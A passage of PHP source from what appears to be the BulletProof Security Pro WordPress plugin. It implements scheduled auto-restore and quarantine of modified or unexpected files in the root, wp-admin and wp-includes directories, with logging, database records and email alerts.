		$DupeRename = date("M-d-Y--H-i-s").'--auto_.htaccess';	

		$log_contents = "\r\n" . '[Root File AutoRestore Logged - Duplicate File Renamed: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $DupeRename .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'AutoRestored File: '.$htaccess."\r\n" . 'Quarantined From/Restore Path: '.$htaccess."\r\n";

		$handle = @fopen( $bpsProLog, 'a' );
		@fwrite($handle, $log_contents);
		fclose($handle);
			
			@copy($htaccess, $Qpath.$DupeRename);
			$rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $htaccess, 'arq_quarantine_backup' => $htaccessARQ, 'arq_quarantine_qpath' => $Qpath.$DupeRename) );
			@copy($htaccessARQ, $htaccess);
			
			if ( substr($sapi_type, 0, 6) != 'apache' || @$permsHtaccess != '0666' || @$permsHtaccess != '0777') { // Windows IIS, XAMPP, etc
				@chmod($htaccess, 0644);
			}
			bps_smonitor_autorestore_email();	
	}
		if ( @$permsHtaccess == '0644' && substr($sapi_type, 0, 6) != 'apache' && $options2['bps_root_htaccess_autolock'] != 'Off') {			
			@chmod($htaccess, 0404);
		}	
	}

	if ( file_exists($indexARQ) && @filesize($index) != @filesize($indexARQ) && !in_array($pathArray, $ExludedPaths) ) {
		$permsIndex = @substr(sprintf('%o', fileperms($index)), -4);
	if ( ! file_exists($Qpath.'index.php') ) {	
		
		$log_contents = "\r\n" . '[Root File AutoRestore Logged: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: index.php' .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'AutoRestored File: '.$index."\r\n" . 'Quarantined From/Restore Path: '.$index."\r\n";

		$handle = @fopen( $bpsProLog, 'a' );
		@fwrite($handle, $log_contents);
		fclose($handle);		
			
			copy($index, $Qpath.'index.php');
			$rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $index, 'arq_quarantine_backup' => $indexARQ, 'arq_quarantine_qpath' => $Qpath.'index.php') );
			copy($indexARQ, $index);	

			if ( substr($sapi_type, 0, 6) != 'apache' || @$permsIndex != '0666' || @$permsIndex != '0777') { // Windows IIS, XAMPP, etc
				@chmod($index, 0644);
			}

			bps_smonitor_autorestore_email();
	
	} else {
		
		$DupeRename = date("M-d-Y--H-i-s").'--index.php';	

		$log_contents = "\r\n" . '[Root File AutoRestore Logged - Duplicate File Renamed: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $DupeRename .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'AutoRestored File: '.$index."\r\n" . 'Quarantined From/Restore Path: '.$index."\r\n";

		$handle = @fopen( $bpsProLog, 'a' );
		@fwrite($handle, $log_contents);
		fclose($handle);
			
			copy($index, $Qpath.$DupeRename);
			$rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $index, 'arq_quarantine_backup' => $indexARQ, 'arq_quarantine_qpath' => $Qpath.$DupeRename) );
			copy($indexARQ, $index);
				
			if ( substr($sapi_type, 0, 6) != 'apache' || @$permsIndex != '0666' || @$permsIndex != '0777') { // Windows IIS, XAMPP, etc
				@chmod($index, 0644);
			}
			bps_smonitor_autorestore_email();	
	}
		if ( @$permsIndex == '0644' && substr($sapi_type, 0, 6) != 'apache' && $Flockoptions['bps_lock_index_php'] == 'yes') {			
			@chmod($index, 0400);
		}	
	}

	if ( file_exists($wpconfigARQ) && @filesize($wpconfig) != @filesize($wpconfigARQ) && !in_array($pathArray, $ExludedPaths) ) {
		$permsWpconfig = @substr( sprintf('%o', fileperms($wpconfig) ), -4);
	if ( ! file_exists($Qpath.'wp-config.php') ) {	
		
		$log_contents = "\r\n" . '[Root File AutoRestore Logged: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: wp-config.php' .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'AutoRestored File: '.$wpconfig."\r\n" . 'Quarantined From/Restore Path: '.$wpconfig."\r\n";

		$handle = @fopen( $bpsProLog, 'a' );
		@fwrite($handle, $log_contents);
		fclose($handle);			

			copy($wpconfig, $Qpath.'wp-config.php');
			$rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $wpconfig, 'arq_quarantine_backup' => $wpconfigARQ, 'arq_quarantine_qpath' => $Qpath.'wp-config.php') );
			copy($wpconfigARQ, $wpconfig);	

			if ( substr($sapi_type, 0, 6) != 'apache' || @$permsWpconfig != '0666' || @$permsWpconfig != '0777') { // Windows IIS, XAMPP, etc
				@chmod($wpconfig, 0644);
			}

			bps_smonitor_autorestore_email();
	
	} else {
		
		$DupeRename = date("M-d-Y--H-i-s").'--wp-config.php';	

		$log_contents = "\r\n" . '[Root File AutoRestore Logged - Duplicate File Renamed: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $DupeRename .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'AutoRestored File: '.$wpconfig."\r\n" . 'Quarantined From/Restore Path: '.$wpconfig."\r\n";

		$handle = @fopen( $bpsProLog, 'a' );
		@fwrite($handle, $log_contents);
		fclose($handle);

			copy($wpconfig, $Qpath.$DupeRename);
			$rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $wpconfig, 'arq_quarantine_backup' => $wpconfigARQ, 'arq_quarantine_qpath' => $Qpath.$DupeRename) );
			copy($wpconfigARQ, $wpconfig);
			
			if ( substr($sapi_type, 0, 6) != 'apache' || @$permsWpconfig != '0666' || @$permsWpconfig != '0777') { // Windows IIS, XAMPP, etc
				@chmod($wpconfig, 0644);
			}			
			bps_smonitor_autorestore_email();	
	}
		if ( @$permsWpconfig == '0644' && substr($sapi_type, 0, 6) != 'apache' && $Flockoptions['bps_lock_wpconfig'] == 'yes') {			
			@chmod($wpconfig, 0400);
		}	
	}

	if ( file_exists($wpblogheaderARQ) && @filesize($wpblogheader) != @filesize($wpblogheaderARQ) && !in_array($pathArray, $ExludedPaths) ) {
		$permsWpblogheader = @substr( sprintf('%o', fileperms($wpblogheader) ), -4);
	if ( ! file_exists($Qpath.'wp-blog-header.php') ) {	
		
		$log_contents = "\r\n" . '[Root File AutoRestore Logged: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: wp-blog-header.php' .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'AutoRestored File: '.$wpblogheader."\r\n" . 'Quarantined From/Restore Path: '.$wpblogheader."\r\n";

		$handle = @fopen( $bpsProLog, 'a' );
		@fwrite($handle, $log_contents);
		fclose($handle);		

			copy($wpblogheader, $Qpath.'wp-blog-header.php');
			$rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $wpblogheader, 'arq_quarantine_backup' => $wpblogheaderARQ, 'arq_quarantine_qpath' => $Qpath.'wp-blog-header.php') );
			copy($wpblogheaderARQ, $wpblogheader);	

			if ( substr($sapi_type, 0, 6) != 'apache' || @$permsWpblogheader != '0666' || @$permsWpblogheader != '0777') { // Windows IIS, XAMPP, etc
				@chmod($wpblogheader, 0644);
			}

			bps_smonitor_autorestore_email();
	
	} else {
		
		$DupeRename = date("M-d-Y--H-i-s").'--wp-blog-header.php';	
		
		$log_contents = "\r\n" . '[Root File AutoRestore Logged - Duplicate File Renamed: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $DupeRename .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'AutoRestored File: '.$wpblogheader."\r\n" . 'Quarantined From/Restore Path: '.$wpblogheader."\r\n";

		$handle = @fopen( $bpsProLog, 'a' );
		@fwrite($handle, $log_contents);
		fclose($handle);		
		
			copy($wpblogheader, $Qpath.$DupeRename);
			$rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $wpblogheader, 'arq_quarantine_backup' => $wpblogheaderARQ, 'arq_quarantine_qpath' => $Qpath.$DupeRename) );
			copy($wpblogheaderARQ, $wpblogheader);
			
			if ( substr($sapi_type, 0, 6) != 'apache' || @$permsWpblogheader != '0666' || @$permsWpblogheader != '0777') { // Windows IIS, XAMPP, etc
				@chmod($wpblogheader, 0644);
			}
			bps_smonitor_autorestore_email();	
	}
		if ( @$permsWpblogheader == '0644' && substr($sapi_type, 0, 6) != 'apache' && $Flockoptions['bps_lock_wpblog_header'] == 'yes') {			
			@chmod($wpblogheader, 0400);
		}	
	}

$fileSize1 = array();
$filePath1 = array();
//$path1 = $_SERVER['DOCUMENT_ROOT']; // using this causes a subfolder site to see root site files
// could have other interesting uses such as designating a separate site to monitor other sites root files
$path1 = rtrim(ABSPATH, "/");
$objects1 = new DirectoryIterator($path1);
	
	// Code Contribution by Hansjˆrg Schwarz hansjoerg-schwarz@nefkom.net
	// Fixes a problem with open_basedir root directory restrictions
	// PHP Fatal error: Uncaught exception 'RuntimeException' with message 'SplFileInfo::isFile(): open_basedir restriction in effect.
	foreach ( $objects1 as $files1 ) {
		try {
			if ( $files1->isFile() ) {

     			$fileSize1[] = $files1->getSize();
     			$filePath1[] = $files1->getPathname();
     		}
		} catch (RuntimeException $e) {}
     }
/*
	foreach ( $objects1 as $files1 ) {
	if ( $files1->isFile() ) {
	
	$fileSize1[] = $files1->getSize();
	$filePath1[] = $files1->getPathname();
	}}
*/
$fileSize2 = array();
$filePath2 = array();
$path2 = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files/';
$path2NS = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files';
$objects2 = new DirectoryIterator($path2);
	
	foreach ( $objects2 as $files2 ) {
		if ( $files2->isFile() ) {
			$fileSize2[] = $files2->getSize();
			$filePath2[] = $files2->getPathname();
		}
	}
	
	$send_email = '';
	$result = array_diff($fileSize1, $fileSize2);
	
	foreach( $result as $diffKey => $diffValue ) {
		if ( array_key_exists($diffKey, $filePath1) ) {
			$sliceValues = array_slice($filePath1, $diffKey, 1);
			
			foreach( $sliceValues as $Akey => $pathValue ) {
				$pathValueARCM = str_replace($path1, $path2NS, $pathValue);
				$Basefilename = basename($pathValue);
				// AutoRestore & Quarantine
				if ( file_exists($pathValueARCM) && ! in_array($pathArray, $sliceValues) && ! in_array($pathValue, $ExludedPaths ) ) {
					
					$log_contents = "\r\n" . '[Root File AutoRestore Logged: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $Basefilename .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'AutoRestored File: '.$pathValue."\r\n" . 'Quarantined From/Restore Path: '.$pathValue."\r\n";

					$handle = @fopen( $bpsProLog, 'a' );
					@fwrite($handle, $log_contents);
					fclose($handle);			
					
					copy($pathValue, $Qpath.$Basefilename);
					
					// XAMPP, WAMP, MAMP or LAMP string replace slashes
					if ( @substr($sapi_type, 0, 6) == 'apache' && preg_match('#\\\\#', ABSPATH, $matches) ) {
						$pathValue = str_replace( array( '\\', '//' ), "/", $pathValue );
						$pathValueARCM = str_replace( array( '\\', '//' ), "/", $pathValueARCM );
						$Qpath = str_replace( array( '\\', '//' ), "/", $Qpath );
					}					
					
					if ( $rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $pathValue, 'arq_quarantine_backup' => $pathValueARCM, 'arq_quarantine_qpath' => $Qpath.$Basefilename) ) ) {
						$send_email = 'send';	
					}
					
					copy($pathValueARCM, $pathValue);

				} // end if file_exists $pathValueARCM
			} // end foreach $sliceValues
		} // end array_key_exists 
	} // end foreach $result
			
	// Start Quarantine ONLY processing			
	$PValueARCM = array();
	
	foreach ( $filePath1 as $PKey => $PValue ) {
		$PValueARCM[] = str_replace($path1, $path2NS, $PValue);	 
	}

	$RemoveSpecialFiles = array_diff($PValueARCM, $pathArray);  // remove 4 special file paths from array
	$resultPathNameSR = array_diff($RemoveSpecialFiles, $filePath2);
	
	$SRValueSourceArray = array();
		
	foreach ( $resultPathNameSR as $SRKeyBack => $SRValueBack ) {
		$SRValueSource = str_replace($path2NS, $path1, $SRValueBack);
		$SRValueSourceArray[] = str_replace($path2NS, $path1, $SRValueBack);
		$BasefilenameQ = basename($SRValueBack);
		
		// Quarantine ONLY - A Duplicate file name does NOT exist in Quarantine
		if ( ! in_array($SRValueSourceArray, $ExludedPaths) && ! file_exists($Qpath.$BasefilenameQ ) ) {
				
				$log_contents = "\r\n" . '[Root File Quarantine Logged: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $BasefilenameQ .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'Quarantined From/Restore Path: '.$SRValueSource."\r\n";

				$handle = @fopen( $bpsProLog, 'a' );
				@fwrite($handle, $log_contents);
				fclose($handle);
					
				// XAMPP, WAMP, MAMP or LAMP string replace slashes
				if ( @substr($sapi_type, 0, 6) == 'apache' && preg_match('#\\\\#', ABSPATH, $matches) ) {
					$SRValueSource = str_replace( array( '\\', '//' ), "/", $SRValueSource );
					$SRValueBack = str_replace( array( '\\', '//' ), "/", $SRValueBack );
					$Qpath = str_replace( array( '\\', '//' ), "/", $Qpath );
				}

				if ( $rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $SRValueSource, 'arq_quarantine_backup' => $SRValueBack, 'arq_quarantine_qpath' => $Qpath.$BasefilenameQ ) ) ) {
					$send_email = 'send';	
				}
					
				rename($SRValueSource, $Qpath.$BasefilenameQ);
		
		} else {	
		
		// Quarantine ONLY - A Duplicate file name DOES exist in Quarantine
		if ( ! in_array($SRValueSourceArray, $ExludedPaths) && file_exists($Qpath.$BasefilenameQ ) ) {	
				$DupeRename = $Qpath.date("M-d-Y--H-i-s").'--'.$BasefilenameQ;
				
				$log_contents = "\r\n" . '[Root File Quarantine Logged - Duplicate File Renamed: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $BasefilenameQ .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'Quarantined From/Restore Path: '.$SRValueSource."\r\n" . 'Renamed To: '.$DupeRename."\r\n";

				$handle = @fopen( $bpsProLog, 'a' );
				@fwrite($handle, $log_contents);
				fclose($handle);
					
				// XAMPP, WAMP, MAMP or LAMP string replace slashes
				if ( @substr($sapi_type, 0, 6) == 'apache' && preg_match('#\\\\#', ABSPATH, $matches) ) {
					$SRValueSource = str_replace( array( '\\', '//' ), "/", $SRValueSource );
					$SRValueBack = str_replace( array( '\\', '//' ), "/", $SRValueBack );
					$DupeRename = str_replace( array( '\\', '//' ), "/", $DupeRename );
				}

				if ( $rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $SRValueSource, 'arq_quarantine_backup' => $SRValueBack, 'arq_quarantine_qpath' => $DupeRename) ) ) {
					$send_email = 'send';
				}
					
				rename($SRValueSource, $DupeRename);			

			} // end if Dupe file exists in Quarantine
		} // end if file Does NOT exist in Quarantine
	} // end foreach $resultPathNameSR

	// ONLY Send 1 email alert
	if ( $send_email != '' ) {
		bps_smonitor_autorestore_email();
	}	
	} // end if ARQ Cron is On
}

// AutoRestore / Quarantine wp-admin
// ARQ Infinity - Copyright (C) 2011-2015 Edward Alexander, AIT-pro.com, edward@ait-pro.com. All rights reserved.
function bps_ARQ_wpadmin() {
global $wpdb, $wp_version;

	if ( ! get_option('bulletproof_security_options_ARCM') ) {
		exit();
	}
	
	$GDMW_options = get_option('bulletproof_security_options_GDMW');	

	if ( $GDMW_options['bps_gdmw_hosting'] == 'yes' ) {
		exit();
	}

	$ARQDir =  WP_CONTENT_DIR . '/bps-backup/autorestore/wp-admin/';
	$ARQFSWPadmin =  WP_CONTENT_DIR . '/bps-backup/autorestore/wp-admin/admin.php';
	
	// ARQ Cron FailSafe Shutdown
	if ( ! is_dir($ARQDir) || !file_exists($ARQFSWPadmin) ) {
		exit();
	}
	
	$bpsClassFile = WP_PLUGIN_DIR . '/bulletproof-security/includes/class.php';
	$bpsClassFileARQMB = WP_CONTENT_DIR . '/bps-backup/master-backups/class.php';

	// Failsafe for class.php ARQ Exclude rules
	if ( file_exists($bpsClassFileARQMB) && filemtime($bpsClassFileARQMB) != filemtime($bpsClassFile) ) {
		exit();
	}

	$options = get_option('bulletproof_security_options_ARCM');

	if ( $options['bps_autorestore_cron'] == 'On' ) {
	
	// WordPress Automatic Updates
	bpsPro_ARQ_wp_autoupdate();

	$Autoupdateoptions = get_option('bulletproof_security_options_wp_version');
	$versionphp = ABSPATH . 'wp-includes/version.php';	
	$gmt_offset = get_option( 'gmt_offset' ) * 3600;	
	$last_modified_time_versionphp = date("F d Y H:i", filemtime($versionphp) + $gmt_offset);
	
	// WordPress Automatic Update FailSafe
	// If a WP automatic update has occurred the bps db time stamp will be less than the file time stamp
	if ( strtotime($Autoupdateoptions['bps_wp_version_last_modified_time']) < strtotime($last_modified_time_versionphp) ) {		
		exit();	
	}

	// ARQ Cron Override is On - do not check/monitor files
	if ( $options['bps_autorestore_cron_override'] == 'On' ) {
		exit();	
	}

	$table_name = $wpdb->prefix . "bpspro_arq_quarantine";
	$bpspro_arq_exclude_table = $wpdb->prefix . "bpspro_arq_exclude";
	$bpsProLog = WP_CONTENT_DIR . '/bps-backup/logs/autorestore_log.txt';
	$timeNow = time();
	$timestamp = date_i18n(get_option('date_format'), strtotime("11/15-1976")) . ' ' . date_i18n(get_option('time_format'), $timeNow + $gmt_offset);
	$htaccessARQ = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-admin/wpadmin.htaccess';
	$htaccess = ABSPATH.'wp-admin/.htaccess';
	$Qpath = WP_CONTENT_DIR . '/bps-backup/quarantine/';

	// Array for XAMPP and possible future Windows IIS issues - this array has multiple purposes
	// includes all source and backup path possibilities
	// used to exclude this file from being checked later in the array slice or for DB Exlude
	$xamppPath1 = ABSPATH.'wp-admin\.htaccess';
	$normalPath = ABSPATH.'wp-admin/.htaccess';
	$XARQPath1 = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-admin/wpadmin.htaccess';
	$XARQPath2 = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-admin\wpadmin.htaccess';
	$XARQPath3 = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-admin/.htaccess';
	$XARQPath4 = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-admin\.htaccess';
	$pathArray = array($xamppPath1, $normalPath, $XARQPath1, $XARQPath2, $XARQPath3, $XARQPath4);
	
	$forward_slash = '/'; // return all rows with a forward slash in them or in other words all rows	
	$getARQExcludeRows = $wpdb->get_results( $wpdb->prepare("SELECT * FROM $bpspro_arq_exclude_table WHERE arq_exclude_source LIKE %s", "%$forward_slash%") );	

	$ExludedPaths = array();
				
	foreach ( $getARQExcludeRows as $row ) {
		$ExludedPaths[] = $row->arq_exclude_source;
	}

	// Special handling of /wp-admin/.htaccess file here
	if ( file_exists($htaccessARQ) && @filesize($htaccess) != @filesize($htaccessARQ) && !in_array($pathArray, $ExludedPaths) ) {
	if ( ! file_exists($Qpath.'wpadmin.htaccess') ) {	

		$log_contents = "\r\n" . '[WP-admin File AutoRestore Logged: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: /wp-admin/.htaccess file renamed to wpadmin.htaccess' .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'AutoRestored File: '.$htaccess."\r\n" . 'Quarantined From/Restore Path: '.$htaccess."\r\n";

		$handle = @fopen( $bpsProLog, 'a' );
		@fwrite($handle, $log_contents);
		fclose($handle);

			@copy($htaccess, $Qpath.'wpadmin.htaccess');
			$rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $htaccess, 'arq_quarantine_backup' => $htaccessARQ, 'arq_quarantine_qpath' => $Qpath.'wpadmin.htaccess') );
			@copy($htaccessARQ, $htaccess);
			bps_smonitor_autorestore_email();
	
	} else {
		
		$DupeRename = date("M-d-Y--H-i-s").'--wpadmin.htaccess';	

		$log_contents = "\r\n" . '[WP-admin File AutoRestore Logged - Duplicate File Renamed: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $DupeRename .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'AutoRestored File: '.$htaccess."\r\n" . 'Quarantined From/Restore Path: '.$htaccess."\r\n";

		$handle = @fopen( $bpsProLog, 'a' );
		@fwrite($handle, $log_contents);
		fclose($handle);
			
			@copy($htaccess, $Qpath.$DupeRename);
			$rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $htaccess, 'arq_quarantine_backup' => $htaccessARQ, 'arq_quarantine_qpath' => $Qpath.$DupeRename) );
			@copy($htaccessARQ, $htaccess);
			bps_smonitor_autorestore_email();
	}
	}

$fileSize1 = array();
$filePath1 = array();
$path1 = ABSPATH.'wp-admin';
$objects1 = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path1), RecursiveIteratorIterator::SELF_FIRST);
	
	foreach ( $objects1 as $files1 ) {
		if ( $files1->isFile() ) {
			$fileSize1[] = $files1->getSize();
			$filePath1[] = $files1->getPathname();
		}
	}

$fileSize2 = array();
$filePath2 = array();
$path2 = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-admin/';
$path2NS = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-admin';
$objects2 = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path2), RecursiveIteratorIterator::SELF_FIRST);	
	
	foreach ( $objects2 as $files2 ) {
		if ( $files2->isFile() ) {
			$fileSize2[] = $files2->getSize();
			$filePath2[] = $files2->getPathname();
		}	
	}
	
	$send_email = '';
	$result = array_diff($fileSize1, $fileSize2);

	foreach( $result as $diffKey => $diffValue ){
		if ( array_key_exists($diffKey, $filePath1) ) {
			$sliceValues = array_slice($filePath1, $diffKey, 1);
			
			foreach( $sliceValues as $Akey => $pathValue ) {
				$pathValueARCM = str_replace($path1, $path2NS, $pathValue);
				$Basefilename = basename($pathValue);
				// AutoRestore & Quarantine
				if ( file_exists($pathValueARCM) && !in_array($pathArray, $sliceValues) && !in_array($pathValue, $ExludedPaths) ) {

					$log_contents = "\r\n" . '[WP-admin File AutoRestore Logged: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $Basefilename .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'AutoRestored File: '.$pathValue."\r\n" . 'Quarantined From/Restore Path: '.$pathValue."\r\n";

					$handle = @fopen( $bpsProLog, 'a' );
					@fwrite($handle, $log_contents);
					fclose($handle);
					
					copy($pathValue, $Qpath.$Basefilename);
					
					if ( $rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $pathValue, 'arq_quarantine_backup' => $pathValueARCM, 'arq_quarantine_qpath' => $Qpath.$Basefilename) ) ) {
						$send_email = 'send';	
					}
					
					copy($pathValueARCM, $pathValue);

				} // end if file_exists $pathValueARCM
			} // end foreach $sliceValues
		} // end array_key_exists 
	} // end foreach $result
			
	// Start Quarantine ONLY processing			
	$PValueARCM = array();
	
	foreach ( $filePath1 as $PKey => $PValue ) {
		$PValueARCM[] = str_replace($path1, $path2NS, $PValue);	 
	}
	
	$htaccessRemove = array_diff($PValueARCM, $pathArray);  // remove the wp-admin .htaccess file path from array
	$resultPathNameSR = array_diff($htaccessRemove, $filePath2);

	$SRValueSourceArray = array();
		
	foreach ( $resultPathNameSR as $SRKeyBack => $SRValueBack ) {
		$SRValueSource = str_replace($path2NS, $path1, $SRValueBack);
		$SRValueSourceArray[] = str_replace($path2NS, $path1, $SRValueBack);
		$BasefilenameQ = basename($SRValueBack);	
		// Quarantine ONLY - A Duplicate file name does NOT exist in Quarantine
		if (!in_array($SRValueSourceArray, $ExludedPaths) && !file_exists($Qpath.$BasefilenameQ)) {	
				
				$log_contents = "\r\n" . '[WP-admin File Quarantine Logged: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $BasefilenameQ .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'Quarantined From/Restore Path: '.$SRValueSource."\r\n";

				$handle = @fopen( $bpsProLog, 'a' );
				@fwrite($handle, $log_contents);
				fclose($handle);				
					
					if ( $rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $SRValueSource, 'arq_quarantine_backup' => $SRValueBack, 'arq_quarantine_qpath' => $Qpath.$BasefilenameQ) ) ) {
						$send_email = 'send';
					}
					
					rename($SRValueSource, $Qpath.$BasefilenameQ);
	
		} else {	
		
		// Quarantine ONLY - A Duplicate file name DOES exist in Quarantine
		if ( ! in_array($SRValueSourceArray, $ExludedPaths) && file_exists($Qpath.$BasefilenameQ ) ) {	
				$DupeRename = $Qpath.date("M-d-Y--H-i-s").'--'.$BasefilenameQ;

				$log_contents = "\r\n" . '[WP-admin File Quarantine Logged - Duplicate File Renamed: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $BasefilenameQ .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'Quarantined From/Restore Path: '.$SRValueSource."\r\n" . 'Renamed To: '.$DupeRename."\r\n";

				$handle = @fopen( $bpsProLog, 'a' );
				@fwrite($handle, $log_contents);
				fclose($handle);
					
					if ( $rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $SRValueSource, 'arq_quarantine_backup' => $SRValueBack, 'arq_quarantine_qpath' => $DupeRename) ) ) {
						$send_email = 'send';
					}
					
					rename($SRValueSource, $DupeRename);			
	
			} // end if Dupe file exists in Quarantine
		} // end if file Does NOT exist in Quarantine
	} // end foreach $resultPathNameSR

	// ONLY Send 1 email alert
	if ( $send_email != '' ) {
		bps_smonitor_autorestore_email();
	}	
	} // end if ARQ Cron is On
}
			
// AutoRestore / Quarantine wp-includes
// ARQ Infinity - Copyright (C) 2011-2015 Edward Alexander, AIT-pro.com, edward@ait-pro.com. All rights reserved.
function bps_ARQ_wpincludes() {
global $wpdb, $wp_version;

	if ( ! get_option('bulletproof_security_options_ARCM' ) ) {
		exit();
	}

	$GDMW_options = get_option('bulletproof_security_options_GDMW');

	if ( $GDMW_options['bps_gdmw_hosting'] == 'yes' ) {
		exit();
	}

	$ARQDir =  WP_CONTENT_DIR . '/bps-backup/autorestore/wp-includes/';
	$ARQFSWPincludes =  WP_CONTENT_DIR . '/bps-backup/autorestore/wp-includes/functions.php';

	// ARQ Cron FailSafe Shutdown
	if ( ! is_dir($ARQDir) || ! file_exists($ARQFSWPincludes) ) {
		exit();
	}
	
	$bpsClassFile = WP_PLUGIN_DIR . '/bulletproof-security/includes/class.php';
	$bpsClassFileARQMB = WP_CONTENT_DIR . '/bps-backup/master-backups/class.php';

	// Failsafe for class.php ARQ Exclude rules
	if ( file_exists($bpsClassFileARQMB) && filemtime($bpsClassFileARQMB) != filemtime($bpsClassFile) ) {
		exit();
	}

	$options = get_option('bulletproof_security_options_ARCM');
	
	if ( $options['bps_autorestore_cron'] == 'On' ) {
	
	// WordPress Automatic Updates
	bpsPro_ARQ_wp_autoupdate();

	$Autoupdateoptions = get_option('bulletproof_security_options_wp_version'); 
	$versionphp = ABSPATH . 'wp-includes/version.php';
	$gmt_offset = get_option( 'gmt_offset' ) * 3600;	
	$last_modified_time_versionphp = date("F d Y H:i", filemtime($versionphp) + $gmt_offset);	
	
	// WordPress Automatic Update FailSafe
	// If a WP automatic update has occurred the bps db time stamp will be less than the file time stamp
	if ( strtotime($Autoupdateoptions['bps_wp_version_last_modified_time']) < strtotime($last_modified_time_versionphp) ) {		
		exit();		
	}

	// ARQ Cron Override is On
	if ( $options['bps_autorestore_cron_override'] == 'On' ) {
		exit();	
	}

	$table_name = $wpdb->prefix . "bpspro_arq_quarantine";
	$bpspro_arq_exclude_table = $wpdb->prefix . "bpspro_arq_exclude";
	$bpsProLog = WP_CONTENT_DIR . '/bps-backup/logs/autorestore_log.txt';
	$timeNow = time();
	$timestamp = date_i18n(get_option('date_format'), strtotime("11/15-1976")) . ' ' . date_i18n(get_option('time_format'), $timeNow + $gmt_offset);


$fileSize1 = array();
$filePath1 = array();
$path1 = ABSPATH.'wp-includes';
$Qpath = WP_CONTENT_DIR . '/bps-backup/quarantine/';
$objects1 = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path1), RecursiveIteratorIterator::SELF_FIRST);	
	
	foreach ( $objects1 as $files1 ) {
		if ( $files1->isFile() ) {
			$fileSize1[] = $files1->getSize();
			$filePath1[] = $files1->getPathname();
		}
	}

$fileSize2 = array();
$filePath2 = array();
$path2 = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-includes/';
$path2NS = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-includes';
$objects2 = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path2), RecursiveIteratorIterator::SELF_FIRST);	
	
	foreach ( $objects2 as $files2 ) {
		if ( $files2->isFile() ) {
			$fileSize2[] = $files2->getSize();
			$filePath2[] = $files2->getPathname();
		}	
	}
	
	$send_email = '';
	$result = array_diff($fileSize1, $fileSize2);
	
	$forward_slash = '/'; // return all rows with a forward slash in them or in other words all rows	
	$getARQExcludeRows = $wpdb->get_results( $wpdb->prepare("SELECT * FROM $bpspro_arq_exclude_table WHERE arq_exclude_source LIKE %s", "%$forward_slash%") );	
	$ExludedPaths = array();
				
	foreach ( $getARQExcludeRows as $row ) {
		$ExludedPaths[] = $row->arq_exclude_source;
	}
	
	foreach( $result as $diffKey => $diffValue ){
		if ( array_key_exists($diffKey, $filePath1) ) {
			$sliceValues = array_slice($filePath1, $diffKey, 1);
			
			foreach( $sliceValues as $Akey => $pathValue ) {
				$pathValueARCM = str_replace($path1, $path2NS, $pathValue);
				$Basefilename = basename($pathValue);
